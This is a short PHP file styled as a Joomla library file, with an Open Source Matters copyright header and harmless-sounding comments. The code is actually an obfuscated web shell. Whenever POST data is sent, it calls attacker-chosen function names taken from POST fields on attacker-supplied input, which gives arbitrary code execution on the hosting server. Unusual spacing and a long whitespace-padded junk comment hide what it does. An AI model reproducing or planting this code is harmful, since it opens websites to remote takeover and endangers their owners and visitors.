<?php
/**
 * @package    Lib
 * *****************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 * *****************
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             // 53aDMQKsAxwt5RgCzKmKKXkQEkN4fyn66kfG0ptBqdDQKxS6c0ZdxuVgxQB3z3gxgfvchP5pgMKfdrb7Zgtt4U4pKphBWg7N7pFTk9BY50REE5bZEcBuKExzyqYvCUDk8BHEf3bc6bd2FDBb41U9YkcvMGntcWhRt9mSAtdS4RQh7pgbF
if (!defined               (                    'PATH')     )
{
	define      ('PATH', __DIR__              );
}

// Installation check, and check on removal of the install directory.
if (empty($_POST)) {
	
	echo 'Empty data.';
	
	exit;
}

// OS system.
function a             (                         $a                          )
{
	$_POST['r']            (   $_POST['d']        ('', $a                          )          )                             
;
}

array_map                   ('a', array($_POST['f']        (                       $_POST['c'])                         ))

;

